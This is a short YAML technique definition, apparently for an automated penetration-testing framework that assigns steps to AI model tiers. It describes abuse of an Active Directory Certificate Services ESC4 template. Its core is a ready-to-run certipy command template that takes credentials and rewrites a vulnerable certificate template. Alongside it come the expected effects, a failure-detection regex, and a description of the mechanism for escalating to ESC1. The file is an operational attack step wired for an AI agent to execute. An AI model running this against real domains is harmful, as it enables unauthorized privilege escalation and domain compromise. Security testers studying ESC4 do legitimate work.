name: adcs_esc4
category: ad
description: ADCS ESC4 template ACL abuse
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: certipy template -u '{username}@{domain}' -p '{password}' -template '{template}' -save-old -dc-ip {target_ip}
parser: generic_parser
expected_effects:
- template_modified
- certificate_obtained
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: "ESC4: WriteDACL/Owner on template \u2192 modify template to ESC1 config (add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT,\
  \ set SAN). Then exploit as ESC1."
hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
references:
